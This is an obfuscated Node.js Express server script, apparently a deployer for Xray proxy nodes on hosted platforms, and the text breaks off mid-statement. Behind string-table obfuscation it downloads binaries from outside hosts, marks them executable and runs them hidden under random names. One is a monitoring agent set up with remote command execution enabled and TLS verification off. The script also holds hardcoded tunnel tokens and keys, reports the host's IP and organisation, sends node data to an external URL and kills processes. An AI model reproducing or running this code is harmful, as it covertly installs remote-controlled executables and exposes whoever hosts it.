const _0x16b64f=_0x5a75;(function(_0x2b18a4,_0x40e80f){const _0x437e6c={_0x214e4f:0x27b,_0x43d0b2:0x248,_0x5d0936:0x20e,_0x11cde5:0x1fa,_0x151dc2:0x218},_0x5940c5=_0x5a75,_0x4b2093=_0x2b18a4();while(!![]){try{const _0x3c62eb=parseInt(_0x5940c5(_0x437e6c._0x214e4f))/0x1+-parseInt(_0x5940c5(0x1f2))/0x2+parseInt(_0x5940c5(_0x437e6c._0x43d0b2))/0x3*(parseInt(_0x5940c5(0x206))/0x4)+-parseInt(_0x5940c5(0x282))/0x5+parseInt(_0x5940c5(_0x437e6c._0x5d0936))/0x6*(-parseInt(_0x5940c5(_0x437e6c._0x11cde5))/0x7)+parseInt(_0x5940c5(0x215))/0x8*(parseInt(_0x5940c5(0x281))/0x9)+-parseInt(_0x5940c5(_0x437e6c._0x151dc2))/0xa*(-parseInt(_0x5940c5(0x22b))/0xb);if(_0x3c62eb===_0x40e80f)break;else _0x4b2093['push'](_0x4b2093['shift']());}catch(_0x55fa06){_0x4b2093['push'](_0x4b2093['shift']());}}}(_0x168f,0xaa5b7));const express=require(_0x16b64f(0x1e4)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x16b64f(0x1ee)),exec=promisify(require(_0x16b64f(0x252))[_0x16b64f(0x1c7)]),UPLOAD_URL=process[_0x16b64f(0x1db)][_0x16b64f(0x25f)]||'',PROJECT_URL=process[_0x16b64f(0x1db)][_0x16b64f(0x20c)]||'',AUTO_ACCESS=process[_0x16b64f(0x1db)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x16b64f(0x1db)][_0x16b64f(0x1f5)]||_0x16b64f(0x253),SUB_PATH=process[_0x16b64f(0x1db)][_0x16b64f(0x223)]||_0x16b64f(0x1c0),PORT=process['env'][_0x16b64f(0x1d7)]||process['env'][_0x16b64f(0x1cc)]||0xbb8,UUID=process[_0x16b64f(0x1db)][_0x16b64f(0x231)]||_0x16b64f(0x272),NEZHA_SERVER=process[_0x16b64f(0x1db)]['NEZHA_SERVER']||_0x16b64f(0x267),NEZHA_PORT=process[_0x16b64f(0x1db)][_0x16b64f(0x27e)]||'',NEZHA_KEY=process[_0x16b64f(0x1db)][_0x16b64f(0x225)]||_0x16b64f(0x234),ARGO_DOMAIN=process[_0x16b64f(0x1db)][_0x16b64f(0x1bc)]||_0x16b64f(0x1bd),ARGO_AUTH=process[_0x16b64f(0x1db)][_0x16b64f(0x26b)]||_0x16b64f(0x235),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x16b64f(0x211)]||_0x16b64f(0x1c2),CFPORT=process[_0x16b64f(0x1db)]['CFPORT']||0x1bb,NAME=process[_0x16b64f(0x1db)][_0x16b64f(0x26f)]||_0x16b64f(0x1fd);function _0x168f(){const _0x3cd4af=['127.0.0.1','NEZHA\x20variable\x20is\x20empty,skip\x20running','PORT','xtls-rprx-vision','push','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','then','del\x20/f\x20/q\x20','readdirSync','https://amd64.ssss.nyc.mn/agent','split','readFile','\x20is\x20running','SERVER_PORT','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x20\x20','nohup\x20','env','map','createWriteStream','win32','TunnelSecret','includes','npm\x20running\x20error:\x20','firefox','2096','express','utf-8','index.html','/tunnel.yml\x20run','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','base64','Download\x20','\x20failed:\x20','https://amd64.ssss.nyc.mn/web','response','util','blackhole','success','abcdefghijklmnopqrstuvwxyz','189682BxirFp','message','/vless-argo','FILE_PATH','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','https://amd64.ssss.nyc.mn/v1','?encryption=none&security=tls&sni=','ArgoDomain:','1849169FdSRuD','countryCode','catch','Galaxy','block','tunnel.json','match','list.txt','Add\x20automatic\x20access\x20task\x20faild:\x20','application/json','\x20>/dev/null\x202>&1','existsSync','32VrcXok','post','443','Nodes\x20uploaded\x20successfully','country_code','\x0avless://','PROJECT_URL','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','12JdEUMd','test','org','CFIP','Subscription\x20uploaded\x20successfully','fileUrl','https://arm64.ssss.nyc.mn/v1','6752616rSYVZZ','pipe','config.json','1790BKNfIl','toString','quic','http','stringify','fileName','send','8443','Error\x20reading\x20boot.log:','https://amd64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/agent','SUB_PATH','\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','random','vless','arm64','mkdirSync','floor','76208Qkwjdj','length','forEach','sub.txt','substring','2087','UUID','--tls','\x0a\x0atrojan://','0jvJWdd5w49WnwfhvcZyaTS328CbqFvv','eyJhIjoiNTQ5ZmI5NzZhOTQ1YTQ2ZGVlYjU3MDA5OGY5MjMxZWMiLCJ0IjoiMDlkOWU3YTgtNDIwMS00ZTVjLWJhNmEtNzQzZWVkMGYxZTYzIiwicyI6IlptVTNOell5WWpRdE1UYzVOUzAwTVROa0xXSXpObUl0T1RBeE9XVXhPRGRsTlRoaCJ9','basename','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','charAt','/api/add-nodes','\x20-c\x20','all','promises','&path=%2Ftrojan-argo%3Fed%3D2560#','/config.json\x20>/dev/null\x202>&1\x20&','listen','status','/api/delete-nodes','2053','false','config.yaml','\x22\x20>\x20/dev/null\x202>&1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1416WKNfta','from','tls','vmess','\x20-p\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','\x20-c\x20\x22','Error\x20executing\x20command:\x20','unlinkSync','child_process','.tmp','taskkill\x20/f\x20/im\x20','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://oooo.serv00.net/add-url','\x20-s\x20','\x0aclient_secret:\x20','aarch64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vmess-argo','filter','data','UPLOAD_URL','2083','tunnel.yml','https://ipapi.co/json','.exe\x20>\x20nul\x202>&1','arm','Error\x20downloading\x20files:','http\x20server\x20is\x20running\x20on\x20port:','nnezha.leiilin.eu.org:443','Content-Type','Empowerment\x20failed\x20for\x20','?security=tls&sni=','ARGO_AUTH','platform','error','clear','NAME','utf8','\x0a\x20\x20credentials-file:\x20','19b4b048-a2ce-4ce3-9e59-9877149989a3','has','Unhandled\x20error\x20in\x20startserver:','/dev/null','unlink','set','php\x20running\x20error:\x20','none','ARGO_DOMAIN:','561783wObTyf','&fp=firefox&type=ws&host=','stream','NEZHA_PORT','pkill\x20-f\x20\x22[','/api/add-subscriptions','9qjdPSs','6643950HVWqCN','Unknown','/vmess-argo?ed=2560','tcp','/trojan-argo','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','writeFileSync','get','log','ARGO_DOMAIN','glaxy.lwxlly.dpdns.org','join','Skipping\x20adding\x20automatic\x20access\x20task','sub','boot.log','cdns.doon.eu.org','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20tunnel:\x20','unshift','https+local://8.8.8.8/dns-query','exec','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','readFileSync'];_0x168f=function(){return _0x3cd4af;};return _0x168f();}!fs[_0x16b64f(0x205)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x16b64f(0x1bb)](FILE_PATH+'\x20is\x20created')):console[_0x16b64f(0x1bb)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3adcec=_0x16b64f,_0x19a413=_0x3adcec(0x1f1);let _0x5b4853='';for(let _0x1b56dd=0x0;_0x1b56dd<0x6;_0x1b56dd++){_0x5b4853+=_0x19a413[_0x3adcec(0x239)](Math[_0x3adcec(0x22a)](Math[_0x3adcec(0x226)]()*_0x19a413[_0x3adcec(0x22c)]));}return _0x5b4853;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x16b64f(0x1be)](FILE_PATH,phpName),webPath=path[_0x16b64f(0x1be)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x16b64f(0x1be)](FILE_PATH,_0x16b64f(0x22e)),listPath=path['join'](FILE_PATH,_0x16b64f(0x201)),bootLogPath=path[_0x16b64f(0x1be)](FILE_PATH,_0x16b64f(0x1c1)),configPath=path[_0x16b64f(0x1be)](FILE_PATH,_0x16b64f(0x217));function deleteNodes(){const _0x549e34={_0x4da983:0x205,_0x31f10b:0x1c9,_0x43fe4b:0x1e5,_0x5d733b:0x1e9,_0x11a353:0x25d,_0x1344fc:0x22c},_0x109779=_0x16b64f;try{if(!UPLOAD_URL)return;if(!fs[_0x109779(_0x549e34._0x4da983)](subPath))return;let _0x439afc;try{_0x439afc=fs[_0x109779(_0x549e34._0x31f10b)](subPath,_0x109779(_0x549e34._0x43fe4b));}catch{return null;}const _0xf90992=Buffer[_0x109779(0x249)](_0x439afc,_0x109779(_0x549e34._0x5d733b))['toString'](_0x109779(0x1e5)),_0x4783a5=_0xf90992[_0x109779(0x1d4)]('\x0a')[_0x109779(_0x549e34._0x11a353)](_0x10f26f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x109779(0x20f)](_0x10f26f));if(_0x4783a5[_0x109779(_0x549e34._0x1344fc)]===0x0)return;return axios[_0x109779(0x207)](UPLOAD_URL+_0x109779(0x242),JSON['stringify']({'nodes':_0x4783a5}),{'headers':{'Content-Type':'application/json'}})[_0x109779(0x1fc)](_0x2e9977=>{return null;}),null;}catch(_0x54747f){return null;}}function cleanupOldFiles(){const _0x4b168e=_0x16b64f;try{const _0x169ff1=fs[_0x4b168e(0x1d2)](FILE_PATH);_0x169ff1[_0x4b168e(0x22d)](_0x568f0b=>{const _0x251c91=path['join'](FILE_PATH,_0x568f0b);try{const _0x4a283a=fs['statSync'](_0x251c91);_0x4a283a['isFile']()&&fs['unlinkSync'](_0x251c91);}catch(_0x5c1aa8){}});}catch(_0x212f92){}}async function generateConfig(){const _0x28740f={_0x1cb2d7:0x275,_0x594528:0x227,_0x3d7a29:0x1f4,_0x28d343:0x279,_0x505c1c:0x279,_0x347f7b:0x21b,_0x54e20a:0x1ca,_0x5a7547:0x24b,_0x198d1:0x25c,_0x57bb4d:0x24a,_0x25efe6:0x21a,_0x16d66d:0x24a,_0x125dcf:0x1ef,_0x3935a5:0x1be},_0x2e2c24=_0x16b64f,_0x220adb={'log':{'access':'/dev/null','error':_0x2e2c24(_0x28740f._0x1cb2d7),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2e2c24(_0x28740f._0x594528),'settings':{'clients':[{'id':UUID,'flow':_0x2e2c24(0x1cd)}],'decryption':_0x2e2c24(0x279),'fallbacks':[{'dest':0xbb9},{'path':_0x2e2c24(_0x28740f._0x3d7a29),'dest':0xbba},{'path':_0x2e2c24(0x25c),'dest':0xbbb},{'path':_0x2e2c24(0x286),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2e2c24(_0x28740f._0x28d343)},'streamSettings':{'network':_0x2e2c24(0x285),'security':_0x2e2c24(_0x28740f._0x505c1c)}},{'port':0xbba,'listen':_0x2e2c24(0x1ca),'protocol':_0x2e2c24(0x227),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2e2c24(0x279)},'streamSettings':{'network':'ws','security':_0x2e2c24(0x279),'wsSettings':{'path':_0x2e2c24(0x1f4)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e2c24(_0x28740f._0x347f7b),'tls',_0x2e2c24(0x21a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2e2c24(_0x28740f._0x54e20a),'protocol':_0x2e2c24(_0x28740f._0x5a7547),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2e2c24(_0x28740f._0x198d1)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e2c24(_0x28740f._0x347f7b),_0x2e2c24(_0x28740f._0x57bb4d),_0x2e2c24(_0x28740f._0x25efe6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2e2c24(0x1ca),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2e2c24(_0x28740f._0x16d66d),_0x2e2c24(0x21a)],'metadataOnly':![]}}],'dns':{'servers':[_0x2e2c24(0x1c6)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x2e2c24(_0x28740f._0x125dcf),'tag':_0x2e2c24(0x1fe)}]};fs[_0x2e2c24(0x288)](path[_0x2e2c24(_0x28740f._0x3935a5)](FILE_PATH,_0x2e2c24(0x217)),JSON[_0x2e2c24(0x21c)](_0x220adb,null,0x2));}function getSystemArchitecture(){const _0x1bce35={_0x1dfd51:0x25a},_0x5aac53=_0x16b64f,_0x53377d=os['arch']();return _0x53377d==='arm'||_0x53377d===_0x5aac53(0x228)||_0x53377d===_0x5aac53(_0x1bce35._0x1dfd51)?'arm':'amd';}function downloadFile(_0x15ca49,_0x53e0d7,_0xdfb6be){const _0x21f76d={_0x329858:0x205,_0x2600ce:0x1dd,_0x135549:0x289},_0x7c8304={_0x192a47:0x1ea,_0x2d28db:0x236,_0x54e367:0x1eb},_0x2d226c={_0x55a229:0x216},_0x41506b=_0x16b64f,_0x7ed2ca=_0x15ca49;!fs[_0x41506b(_0x21f76d._0x329858)](FILE_PATH)&&fs[_0x41506b(0x229)](FILE_PATH,{'recursive':!![]});const _0x333313=fs[_0x41506b(_0x21f76d._0x2600ce)](_0x7ed2ca);axios({'method':_0x41506b(_0x21f76d._0x135549),'url':_0x53e0d7,'responseType':_0x41506b(0x27d)})[_0x41506b(0x1d0)](_0x4a9af9=>{const _0x51f675={_0x54e28c:0x276,_0x36a12b:0x1f3},_0x1a5335=_0x41506b;_0x4a9af9['data'][_0x1a5335(_0x2d226c._0x55a229)](_0x333313),_0x333313['on']('finish',()=>{_0x333313['close'](),console['log']('Download\x20'+path['basename'](_0x7ed2ca)+'\x20successfully'),_0xdfb6be(null,_0x7ed2ca);}),_0x333313['on'](_0x1a5335(0x26d),_0x21c890=>{const _0x5c1be7=_0x1a5335;fs[_0x5c1be7(_0x51f675._0x54e28c)](_0x7ed2ca,()=>{});const _0x22c38e=_0x5c1be7(0x1ea)+path[_0x5c1be7(0x236)](_0x7ed2ca)+'\x20failed:\x20'+_0x21c890[_0x5c1be7(_0x51f675._0x36a12b)];console[_0x5c1be7(0x26d)](_0x22c38e),_0xdfb6be(_0x22c38e);});})[_0x41506b(0x1fc)](_0xae5d27=>{const _0x58973b=_0x41506b,_0x46f13b=_0x58973b(_0x7c8304._0x192a47)+path[_0x58973b(_0x7c8304._0x2d28db)](_0x7ed2ca)+_0x58973b(_0x7c8304._0x54e367)+_0xae5d27[_0x58973b(0x1f3)];console[_0x58973b(0x26d)](_0x46f13b),_0xdfb6be(_0x46f13b);});}async function downloadFilesAndRun(){const _0x588373={_0x3120da:0x1bb,_0x3179a1:0x287,_0x1ef9f1:0x1dc,_0x246ccf:0x23c,_0x412f94:0x21f,_0x495f88:0x1e3,_0x41930e:0x273,_0xd9c8a6:0x259,_0xca6a1d:0x245,_0x372419:0x26d,_0x51714f:0x278,_0x3713bc:0x1e3,_0x1b4e25:0x258,_0x30df86:0x247,_0xe44098:0x1bb,_0x221845:0x1d6,_0x1031cc:0x23f,_0x35c5d3:0x25b,_0x9ae67f:0x200,_0x1d9cd8:0x238,_0x1ae92d:0x224},_0x2c094c=_0x16b64f,_0x75a26b=getSystemArchitecture(),_0x5f4632=getFilesForArchitecture(_0x75a26b);if(_0x5f4632[_0x2c094c(0x22c)]===0x0){console[_0x2c094c(_0x588373._0x3120da)](_0x2c094c(_0x588373._0x3179a1));return;}const _0x44a9f9=_0x5f4632[_0x2c094c(_0x588373._0x1ef9f1)](_0x5738b4=>{return new Promise((_0x2c38e5,_0x5dddcf)=>{const _0x5a929b=_0x5a75;downloadFile(_0x5738b4[_0x5a929b(0x21d)],_0x5738b4[_0x5a929b(0x213)],(_0x4f809d,_0x5ab15d)=>{_0x4f809d?_0x5dddcf(_0x4f809d):_0x2c38e5(_0x5ab15d);});});});try{await Promise[_0x2c094c(_0x588373._0x246ccf)](_0x44a9f9);}catch(_0x58fa64){console['error'](_0x2c094c(0x265),_0x58fa64);return;}function _0x313097(_0x27cc32){const _0x43c821=0x1fd;_0x27cc32['forEach'](_0x5e4076=>{const _0x3e25c7=_0x5a75;fs[_0x3e25c7(0x205)](_0x5e4076)&&fs['chmod'](_0x5e4076,_0x43c821,_0x692967=>{const _0x45cc66=_0x3e25c7;_0x692967?console[_0x45cc66(0x26d)](_0x45cc66(0x269)+_0x5e4076+':\x20'+_0x692967):console['log']('Empowerment\x20success\x20for\x20'+_0x5e4076+':\x20'+_0x43c821[_0x45cc66(0x219)](0x8));});});}const _0x31bf73=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x313097(_0x31bf73);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x37c60d=NEZHA_SERVER[_0x2c094c(0x1e0)](':')?NEZHA_SERVER[_0x2c094c(0x1d4)](':')['pop']():'',_0x88496b=new Set([_0x2c094c(0x208),_0x2c094c(_0x588373._0x412f94),_0x2c094c(_0x588373._0x495f88),_0x2c094c(0x230),_0x2c094c(0x260),_0x2c094c(0x243)]),_0x419e49=_0x88496b[_0x2c094c(_0x588373._0x41930e)](_0x37c60d)?'true':_0x2c094c(0x244),_0x5a07c3=_0x2c094c(_0x588373._0xd9c8a6)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2c094c(0x20d)+_0x419e49+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2c094c(0x288)](path[_0x2c094c(0x1be)](FILE_PATH,_0x2c094c(_0x588373._0xca6a1d)),_0x5a07c3);const _0xe872ee='nohup\x20'+phpPath+_0x2c094c(0x24f)+FILE_PATH+_0x2c094c(0x24d);try{await exec(_0xe872ee),console[_0x2c094c(0x1bb)](phpName+'\x20is\x20running'),await new Promise(_0x83e544=>setTimeout(_0x83e544,0x3e8));}catch(_0x3dcdd6){console[_0x2c094c(_0x588373._0x372419)](_0x2c094c(_0x588373._0x51714f)+_0x3dcdd6);}}else{let _0x3f1bba='';const _0x5587f=['443',_0x2c094c(0x21f),_0x2c094c(_0x588373._0x3713bc),_0x2c094c(0x230),_0x2c094c(0x260),'2053'];_0x5587f[_0x2c094c(0x1e0)](NEZHA_PORT)&&(_0x3f1bba=_0x2c094c(0x232));const _0x3ec210='nohup\x20'+npmPath+_0x2c094c(_0x588373._0x1b4e25)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c094c(0x24c)+NEZHA_KEY+'\x20'+_0x3f1bba+_0x2c094c(_0x588373._0x30df86);try{await exec(_0x3ec210),console[_0x2c094c(_0x588373._0xe44098)](npmName+_0x2c094c(_0x588373._0x221845)),await new Promise(_0x5667fb=>setTimeout(_0x5667fb,0x3e8));}catch(_0x356eed){console[_0x2c094c(0x26d)](_0x2c094c(0x1e1)+_0x356eed);}}}else console[_0x2c094c(_0x588373._0xe44098)](_0x2c094c(0x1cb));const _0x2822c2=_0x2c094c(0x1da)+webPath+_0x2c094c(0x23b)+FILE_PATH+_0x2c094c(_0x588373._0x1031cc);try{await exec(_0x2822c2),console['log'](webName+_0x2c094c(_0x588373._0x221845)),await new Promise(_0x3cc964=>setTimeout(_0x3cc964,0x3e8));}catch(_0x45af15){console[_0x2c094c(0x26d)]('web\x20running\x20error:\x20'+_0x45af15);}if(fs[_0x2c094c(0x205)](botPath)){let _0x2ebc13;if(ARGO_AUTH[_0x2c094c(0x200)](/^[A-Z0-9a-z=]{120,250}$/))_0x2ebc13=_0x2c094c(_0x588373._0x35c5d3)+ARGO_AUTH;else ARGO_AUTH[_0x2c094c(_0x588373._0x9ae67f)](/TunnelSecret/)?_0x2ebc13='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2c094c(0x1e7):_0x2ebc13=_0x2c094c(_0x588373._0x1d9cd8)+FILE_PATH+_0x2c094c(0x1c3)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2ebc13+_0x2c094c(_0x588373._0x1ae92d)),console[_0x2c094c(0x1bb)](botName+'\x20is\x20running'),await new Promise(_0x4a4d9d=>setTimeout(_0x4a4d9d,0x7d0));}catch(_0x1a62f5){console[_0x2c094c(0x26d)](_0x2c094c(0x250)+_0x1a62f5);}}await new Promise(_0x4ab8ff=>setTimeout(_0x4ab8ff,0x1388));}function getFilesForArchitecture(_0x2c5e5b){const _0x4e4225={_0x403a02:0x222,_0x531612:0x1c5,_0x542694:0x264,_0x5a4011:0x1f7},_0x287e04=_0x16b64f;let _0x304f71;_0x2c5e5b===_0x287e04(0x264)?_0x304f71=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x304f71=[{'fileName':webPath,'fileUrl':_0x287e04(0x1ec)},{'fileName':botPath,'fileUrl':_0x287e04(0x221)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x190886=_0x2c5e5b==='arm'?_0x287e04(_0x4e4225._0x403a02):_0x287e04(0x1d3);_0x304f71[_0x287e04(_0x4e4225._0x531612)]({'fileName':npmPath,'fileUrl':_0x190886});}else{const _0x57d41b=_0x2c5e5b===_0x287e04(_0x4e4225._0x542694)?_0x287e04(0x214):_0x287e04(_0x4e4225._0x5a4011);_0x304f71[_0x287e04(0x1c5)]({'fileName':phpPath,'fileUrl':_0x57d41b});}}return _0x304f71;}function argoType(){const _0x107d09={_0xa1fad9:0x1e0,_0x340c76:0x288,_0x223184:0x1ff,_0x581541:0x1be,_0x3a6d6b:0x1c8},_0x447889=_0x16b64f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x447889(0x1bb)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x447889(_0x107d09._0xa1fad9)](_0x447889(0x1df))){fs[_0x447889(_0x107d09._0x340c76)](path['join'](FILE_PATH,_0x447889(_0x107d09._0x223184)),ARGO_AUTH);const _0x9cd947=_0x447889(0x1c4)+ARGO_AUTH['split']('\x22')[0xb]+_0x447889(0x271)+path[_0x447889(_0x107d09._0x581541)](FILE_PATH,_0x447889(0x1ff))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x447889(_0x107d09._0x3a6d6b)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x447889(0x288)](path['join'](FILE_PATH,_0x447889(0x261)),_0x9cd947);}else console['log'](_0x447889(0x1cf));}async function extractDomains(){const _0x5e9cfc={_0x3bde18:0x1bb,_0x10f10d:0x27a,_0x3d75db:0x1c1,_0x53c8a6:0x22c,_0x28986d:0x1f9,_0x32fe80:0x256,_0x2b4872:0x224,_0x2a3ac4:0x26d,_0xb83cd0:0x26d},_0x7fae54={_0x4314f3:0x289,_0x54011e:0x25e,_0x19a2e3:0x25e,_0x37f833:0x20a,_0x3befe6:0x25e,_0x28db83:0x1f0,_0x3912ff:0x25e,_0xcc2f82:0x25e,_0x1cd6d3:0x25e,_0x11f22f:0x283},_0x50591a={_0x3c7ac0:0x22f},_0x5bc593={_0x18e5dd:0x1ce},_0x4e4b8c=_0x16b64f;let _0x21c519;if(ARGO_AUTH&&ARGO_DOMAIN)_0x21c519=ARGO_DOMAIN,console[_0x4e4b8c(_0x5e9cfc._0x3bde18)](_0x4e4b8c(_0x5e9cfc._0x10f10d),_0x21c519),await _0x37e92f(_0x21c519);else try{const _0x31624b=fs[_0x4e4b8c(0x1c9)](path['join'](FILE_PATH,_0x4e4b8c(_0x5e9cfc._0x3d75db)),_0x4e4b8c(0x1e5)),_0x2df6b9=_0x31624b['split']('\x0a'),_0x147303=[];_0x2df6b9[_0x4e4b8c(0x22d)](_0x490444=>{const _0xd006be=_0x4e4b8c,_0x12ac23=_0x490444['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x12ac23){const _0x1feb0a=_0x12ac23[0x1];_0x147303[_0xd006be(_0x5bc593._0x18e5dd)](_0x1feb0a);}});if(_0x147303[_0x4e4b8c(_0x5e9cfc._0x53c8a6)]>0x0)_0x21c519=_0x147303[0x0],console['log'](_0x4e4b8c(_0x5e9cfc._0x28986d),_0x21c519),await _0x37e92f(_0x21c519);else{console['log'](_0x4e4b8c(_0x5e9cfc._0x32fe80)),fs[_0x4e4b8c(0x251)](path[_0x4e4b8c(0x1be)](FILE_PATH,_0x4e4b8c(0x1c1)));async function _0x3091d7(){const _0x854633=_0x4e4b8c;try{process[_0x854633(0x26c)]===_0x854633(0x1de)?await exec(_0x854633(0x254)+botName+_0x854633(0x263)):await exec(_0x854633(0x27f)+botName['charAt'](0x0)+']'+botName[_0x854633(_0x50591a._0x3c7ac0)](0x1)+_0x854633(0x246));}catch(_0x46a177){}}_0x3091d7(),await new Promise(_0x2ff6d0=>setTimeout(_0x2ff6d0,0xbb8));const _0x1bab22='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4e4b8c(0x1da)+botPath+'\x20'+_0x1bab22+_0x4e4b8c(_0x5e9cfc._0x2b4872)),console[_0x4e4b8c(_0x5e9cfc._0x3bde18)](botName+_0x4e4b8c(0x1d6)),await new Promise(_0x2d2922=>setTimeout(_0x2d2922,0xbb8)),await extractDomains();}catch(_0x2085f8){console[_0x4e4b8c(_0x5e9cfc._0x2a3ac4)](_0x4e4b8c(0x250)+_0x2085f8);}}}catch(_0x416274){console[_0x4e4b8c(_0x5e9cfc._0xb83cd0)](_0x4e4b8c(0x220),_0x416274);}async function _0x44097c(){const _0x22253d=_0x4e4b8c;try{const _0x9c70d6=await axios[_0x22253d(_0x7fae54._0x4314f3)](_0x22253d(0x262),{'timeout':0xbb8});if(_0x9c70d6[_0x22253d(_0x7fae54._0x54011e)]&&_0x9c70d6[_0x22253d(_0x7fae54._0x19a2e3)][_0x22253d(0x20a)]&&_0x9c70d6[_0x22253d(0x25e)]['org'])return _0x9c70d6[_0x22253d(0x25e)][_0x22253d(_0x7fae54._0x37f833)]+'_'+_0x9c70d6[_0x22253d(_0x7fae54._0x54011e)]['org'];}catch(_0x368617){try{const _0x1d4018=await axios['get']('http://ip-api.com/json',{'timeout':0xbb8});if(_0x1d4018[_0x22253d(_0x7fae54._0x54011e)]&&_0x1d4018[_0x22253d(_0x7fae54._0x3befe6)]['status']===_0x22253d(_0x7fae54._0x28db83)&&_0x1d4018['data']['countryCode']&&_0x1d4018[_0x22253d(_0x7fae54._0x3912ff)]['org'])return _0x1d4018[_0x22253d(_0x7fae54._0xcc2f82)][_0x22253d(0x1fb)]+'_'+_0x1d4018[_0x22253d(_0x7fae54._0x1cd6d3)][_0x22253d(0x210)];}catch(_0x5d5c72){}}return _0x22253d(_0x7fae54._0x11f22f);}async function _0x37e92f(_0x24c39f){const _0x509bf5=await _0x44097c(),_0xd25c2d=NAME?NAME+'-'+_0x509bf5:_0x509bf5;return new Promise(_0x3f1bf6=>{const _0x1cf63d={_0x15106d:0x20b,_0x59be62:0x27c,_0x4c6826:0x219,_0xa16c84:0x26a,_0x3b7b1d:0x23e,_0x2ebc70:0x1d9,_0x4541ff:0x1bb,_0x2408f8:0x237,_0x2d5d20:0x289},_0x1acb49={_0x2e3b02:0x249,_0x4ea0a2:0x277};setTimeout(()=>{const 